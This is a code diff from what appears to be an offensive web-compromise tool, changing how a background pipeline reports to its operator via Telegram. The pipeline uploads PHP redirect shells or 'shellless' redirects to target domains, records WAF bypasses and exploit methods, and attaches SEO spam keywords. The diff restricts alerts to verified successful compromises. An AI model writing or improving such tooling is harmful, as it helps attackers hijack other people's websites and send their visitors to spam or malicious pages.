@@ -401,31 +401,38 @@ async function runPipelineInBackground(
       } : undefined,
     });
 
-    // Notify via Telegram (primary notification channel)
-    try {
-      const realDeployedUrls = pipelineResult?.uploadedFiles
-        .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
-        .map(f => f.url)
-        .filter(url => url !== params.targetDomain) || [];
-      const shelllessRedirects = pipelineResult?.uploadedFiles
-        .filter(f => f.method.startsWith("shellless_") && f.redirectWorks)
-        .map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`) || [];
-      const deployedUrls = realDeployedUrls.length > 0 ? realDeployedUrls : shelllessRedirects;
+    // Notify via Telegram — ONLY on verified success (redirect confirmed working)
+    if (hasVerified) {
+      try {
+        const realDeployedUrls = pipelineResult?.uploadedFiles
+          .filter(f => !f.method.startsWith("shellless_") || f.redirectWorks)
+          .map(f => f.url)
+          .filter(url => url !== params.targetDomain) || [];
+        const shelllessRedirects = pipelineResult?.uploadedFiles
+          .filter(f => f.method.startsWith("shellless_") && f.redirectWorks)
+          .map(f => `${f.url} (via ${f.method.replace("shellless_", "")})`) || [];
+        const deployedUrls = realDeployedUrls.length > 0 ? realDeployedUrls : shelllessRedirects;
 
-      await sendTelegramNotification({
-        type: hasVerified ? "success" : (hasShelllessRedirect ? "partial" : (partial ? "partial" : "failure")),
-        targetUrl: params.targetDomain,
-        redirectUrl: params.redirectUrl,
-        deployedUrls,
-        shellType: "redirect_php",
-        duration,
-        errors: pipelineResult?.errors.slice(0, 5) || [],
-        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
-        cloakingEnabled: false,
-        injectedFiles: 0,
-        details: statusText,
-      });
-    } catch { /* best-effort */ }
+        const wafInfo = pipelineResult?.wafDetection?.detected
+          ? `WAF: ${pipelineResult.wafDetection.wafName} (bypassed!)` : "No WAF detected";
+        const exploitMethod = pipelineResult?.verifiedFiles?.[0]?.method || "unknown";
+
+        await sendTelegramNotification({
+          type: "success",
+          targetUrl: params.targetDomain,
+          redirectUrl: params.redirectUrl,
+          deployedUrls,
+          shellType: "redirect_php",
+          duration,
+          errors: [],
+          keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
+          cloakingEnabled: false,
+          injectedFiles: deployedUrls.length,
+          details: `✅ VERIFIED SUCCESS\n🎯 Method: ${exploitMethod}\n🛡️ ${wafInfo}\n📁 ${deployedUrls.length} files placed & redirect confirmed`,
+        });
+      } catch { /* best-effort */ }
+    }
+    // No Telegram for failures/partial — only verified success
 
   } catch (e: any) {
     const duration = Date.now() - startTime;
@@ -437,22 +444,7 @@ async function runPipelineInBackground(
       progress: 0,
     });
 
-    // Notify failure via Telegram
-    try {
-      await sendTelegramNotification({
-        type: "failure",
-        targetUrl: params.targetDomain,
-        redirectUrl: params.redirectUrl,
-        deployedUrls: [],
-        shellType: "unknown",
-        duration,
-        errors: [e.message],
-        keywords: Array.isArray(params.seoKeywords) ? params.seoKeywords : (params.seoKeywords ? [params.seoKeywords] : []),
-        cloakingEnabled: false,
-        injectedFiles: 0,
-        details: `Job #${deployId} error: ${e.message}`,
-      });
-    } catch { /* best-effort */ }
+    // No Telegram for failures — only verified success gets notified
   } finally {
     runningJobs.delete(deployId);
   }
